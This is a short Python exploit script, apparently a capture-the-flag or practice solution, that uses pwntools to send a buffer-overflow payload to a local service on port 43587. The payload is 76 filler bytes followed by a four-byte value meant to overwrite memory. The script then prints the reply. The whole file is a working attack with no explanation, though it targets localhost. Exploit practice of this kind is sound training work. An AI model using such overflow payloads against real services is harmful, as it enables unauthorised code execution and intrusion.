from pwn import *


address = ("127.0.0.1", 43587)
payload = b"a" * 76 + b"\xff\x32\x43\xba"

conn = remote(address[0], address[1])
conn.sendline(payload)
print(conn.recvall())